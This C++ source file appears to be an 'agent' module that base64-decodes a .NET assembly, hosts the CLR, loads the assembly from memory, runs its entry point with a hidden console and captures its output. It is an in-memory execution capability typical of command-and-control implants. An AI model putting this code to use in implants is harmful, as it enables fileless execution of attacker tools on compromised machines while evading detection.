#include "InlineAssembly.h"
#include "Helpers.h"
#include <metahost.h>
#include <vector>
#include <sstream>

#pragma comment(lib, "mscoree.lib")

// Import mscorlib type library — MSVC generates mscorlib.tlh/.tli on first build.
// Requires .NET Framework 4.x to be installed on the build machine.
// auto_rename: renames identifiers that clash with C++ reserved words (e.g. 'or' -> 'or__')
//              which prevents the || parse errors in the generated TLH.
#import <mscorlib.tlb> raw_interfaces_only auto_rename \
    rename("ReportEvent", "MSCOREE_ReportEvent") \
    rename("value",       "MSCOREE_value")        \
    rename("Currency",    "MSCOREE_Currency")

#define PIPE_BUFFER_LENGTH 0x10000

// Helper: format an HRESULT as hex string.
static std::string hrStr(HRESULT hr) {
    char buf[16];
    sprintf_s(buf, "0x%08lX", hr);
    return buf;
}

std::string InlineAssembly(std::vector<std::string> arguments, const std::string& file_data) {
    if (file_data.empty())
        return "Error: no assembly data";

    std::string assembly_bytes = base64_decode(file_data);
    if (assembly_bytes.empty())
        return "Error: failed to decode assembly";

    // ── PE / managed-assembly header validation ──────────────────────────────
    // DataDirectory[14] (CLR COM descriptor) must be present and non-zero.
    // Correct offsets from the start of the optional header:
    //   PE32  (magic=0x10B): DataDirectory starts at +0x60, entry 14 at +0x60+14*8 = +0xD0
    //   PE32+ (magic=0x20B): DataDirectory starts at +0x70, entry 14 at +0x70+14*8 = +0xE0
    {
        const auto*  bytes = reinterpret_cast<const BYTE*>(assembly_bytes.data());
        const SIZE_T size  = assembly_bytes.size();

        if (size < 64 || bytes[0] != 'M' || bytes[1] != 'Z')
            return "Error: not a PE file (missing MZ header) — select a managed .NET assembly";

        DWORD peOffset = *reinterpret_cast<const DWORD*>(bytes + 0x3C);
        if (size < static_cast<SIZE_T>(peOffset) + 24)
            return "Error: PE header truncated";

        if (bytes[peOffset]   != 'P' || bytes[peOffset+1] != 'E' ||
            bytes[peOffset+2] != 0   || bytes[peOffset+3] != 0)
            return "Error: invalid PE signature — select a managed .NET assembly";

        DWORD optOffset = peOffset + 24;
        WORD  magic     = *reinterpret_cast<const WORD*>(bytes + optOffset);
        // DataDirectory[14] offset from optional header start
        DWORD clrEntryOffset = (magic == 0x20B) ? 0xE0 : 0xD0;

        if (size < static_cast<SIZE_T>(optOffset) + clrEntryOffset + 8)
            return "Error: optional header too short — select a managed .NET EXE or DLL";

        DWORD clrRva = *reinterpret_cast<const DWORD*>(bytes + optOffset + clrEntryOffset);
        if (clrRva == 0)
            return "Error: not a managed assembly (no CLR header) — select a .NET EXE or DLL";
    }

    // ── CLR variable declarations ─────────────────────────────────────────────
    HRESULT                 HResult         = S_OK;
    const char*             failedStep      = nullptr;
    ICLRMetaHost*           IMetaHost       = nullptr;
    ICLRRuntimeInfo*        IRuntimeInfo    = nullptr;
    ICorRuntimeHost*        IRuntimeHost    = nullptr;
    IUnknown*               IAppDomainThunk = nullptr;
    mscorlib::_AppDomain*   AppDomain       = nullptr;
    mscorlib::_Assembly*    Assembly        = nullptr;
    mscorlib::_MethodInfo*  MethodInfo      = nullptr;
    SAFEARRAYBOUND          SafeArrayBound  = {};
    SAFEARRAY*              SafeAssembly    = nullptr;
    SAFEARRAY*              SafeExpected    = nullptr;
    SAFEARRAY*              SafeArguments   = nullptr;
    PWSTR*                  AssemblyArgv    = nullptr;
    ULONG                   AssemblyArgc    = 0;
    LONG                    Index           = 0;
    VARIANT                 VariantArgv     = {};
    BOOL                    IsLoadable      = FALSE;
    HWND                    ConExist        = nullptr;
    HWND                    ConHandle       = nullptr;
    HANDLE                  BackupHandle    = nullptr;
    HANDLE                  IoPipeRead      = nullptr;
    HANDLE                  IoPipeWrite     = nullptr;
    std::string             output;

    // Build wide argument string for CommandLineToArgvW
    std::wstring wargs;
    for (size_t i = 0; i < arguments.size(); i++) {
        if (i > 0) wargs += L' ';
        wargs += std::wstring(arguments[i].begin(), arguments[i].end());
    }

#define CLR_STEP(expr, name)                        \
    failedStep = name;                              \
    if (FAILED(HResult = (expr))) goto _CLEANUP;

    // ── CLR bootstrap ────────────────────────────────────────────────────────
    CLR_STEP(CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                 reinterpret_cast<PVOID*>(&IMetaHost)),
             "CLRCreateInstance")

    CLR_STEP(IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
                 reinterpret_cast<PVOID*>(&IRuntimeInfo)),
             "GetRuntime(v4.0.30319)")

    failedStep = "IsLoadable";
    if (FAILED(HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
        if (SUCCEEDED(HResult)) HResult = E_FAIL;
        goto _CLEANUP;
    }

    CLR_STEP(IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
                 reinterpret_cast<PVOID*>(&IRuntimeHost)),
             "GetInterface(CorRuntimeHost)")

    CLR_STEP(IRuntimeHost->Start(), "IRuntimeHost::Start")

    // ── AppDomain ────────────────────────────────────────────────────────────
    CLR_STEP(IRuntimeHost->CreateDomain(L"InlineAssembly", nullptr, &IAppDomainThunk),
             "CreateDomain")

    CLR_STEP(IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)),
             "QueryInterface(_AppDomain)")

    // ── Load assembly bytes via SAFEARRAY ────────────────────────────────────
    {
        PVOID pvData = nullptr;
        SafeArrayBound = { static_cast<ULONG>(assembly_bytes.size()), 0 };
        SafeAssembly   = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);
        if (!SafeAssembly) { HResult = E_OUTOFMEMORY; failedStep = "SafeArrayCreate"; goto _CLEANUP; }
        failedStep = "SafeArrayAccessData";
        if (FAILED(HResult = SafeArrayAccessData(SafeAssembly, &pvData))) goto _CLEANUP;
        memcpy(pvData, assembly_bytes.data(), assembly_bytes.size());
        SafeArrayUnaccessData(SafeAssembly);
    }

    // Load_3 returns 0x8007000B (ERROR_BAD_FORMAT / BadImageFormatException) when
    // the assembly targets .NET Core / .NET 5+ instead of .NET Framework 4.x.
    // The agent uses the .NET Framework CLR (v4.0.30319) and cannot load assemblies
    // compiled for a different runtime. Compile the target assembly with:
    //   <TargetFramework>net48</TargetFramework>   (in .csproj)
    // or via csc:  csc /target:exe Hello.cs  (defaults to .NET Framework on Windows)
    if (FAILED(HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
        if (HResult == HRESULT_FROM_WIN32(ERROR_BAD_FORMAT)) {
            return "Error: AppDomain::Load_3 failed (0x8007000B) — "
                   "assembly must target .NET Framework 4.x, not .NET Core / .NET 5+. "
                   "Set <TargetFramework>net48</TargetFramework> in the .csproj and recompile.";
        }
        failedStep = "AppDomain::Load_3";
        goto _CLEANUP;
    }

    // ── Entry point ──────────────────────────────────────────────────────────
    CLR_STEP(Assembly->get_EntryPoint(&MethodInfo), "Assembly::get_EntryPoint")
    CLR_STEP(MethodInfo->GetParameters(&SafeExpected), "MethodInfo::GetParameters")

    // ── Build argument SAFEARRAY (only if entry point expects parameters) ────
    if (SafeExpected && SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

        if (!wargs.empty())
            AssemblyArgv = CommandLineToArgvW(wargs.c_str(), reinterpret_cast<PINT>(&AssemblyArgc));

        VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
        VariantArgv.vt     = VT_ARRAY | VT_BSTR;

        for (Index = 0; Index < static_cast<LONG>(AssemblyArgc); Index++)
            SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));

        Index = 0;
        SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
        SafeArrayDestroy(VariantArgv.parray);
    }

    // ── Pipe + stdout redirect ───────────────────────────────────────────────
    if (!CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH)) {
        HResult = HRESULT_FROM_WIN32(GetLastError());
        failedStep = "CreatePipe";
        goto _CLEANUP;
    }

    if (!(ConExist = GetConsoleWindow())) {
        AllocConsole();
        ConHandle = GetConsoleWindow();
        if (ConHandle) ShowWindow(ConHandle, SW_HIDE);
    }

    BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

    // ── Invoke entry point ───────────────────────────────────────────────────
    MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr);

    // Restore stdout before reading
    SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    BackupHandle = nullptr;
    failedStep   = nullptr;

    // ── Drain pipe (non-blocking) ────────────────────────────────────────────
    {
        DWORD bytesAvailable = 0;
        while (PeekNamedPipe(IoPipeRead, nullptr, 0, nullptr, &bytesAvailable, nullptr)
               && bytesAvailable > 0) {
            std::vector<char> buf(bytesAvailable);
            DWORD bytesRead = 0;
            if (ReadFile(IoPipeRead, buf.data(), bytesAvailable, &bytesRead, nullptr) && bytesRead > 0)
                output.append(buf.data(), bytesRead);
        }
    }

#undef CLR_STEP

_CLEANUP:
    if (BackupHandle)           SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
    if (AssemblyArgv)           LocalFree(AssemblyArgv);
    if (SafeAssembly)           SafeArrayDestroy(SafeAssembly);
    if (SafeArguments)          SafeArrayDestroy(SafeArguments);
    if (MethodInfo)             MethodInfo->Release();
    if (AppDomain)              AppDomain->Release();
    if (IAppDomainThunk)        IAppDomainThunk->Release();
    if (IRuntimeHost)           IRuntimeHost->Release();
    if (IRuntimeInfo)           IRuntimeInfo->Release();
    if (IMetaHost)              IMetaHost->Release();
    if (IoPipeWrite)            CloseHandle(IoPipeWrite);
    if (IoPipeRead)             CloseHandle(IoPipeRead);
    if (ConHandle && !ConExist) FreeConsole();

    if (FAILED(HResult)) {
        std::string msg = "Error: ";
        if (failedStep) msg += std::string(failedStep) + " failed";
        else            msg += "CLR execution failed";
        msg += " (HRESULT " + hrStr(HResult) + ")";
        return msg;
    }

    return output.empty() ? "(no output)" : output;
}
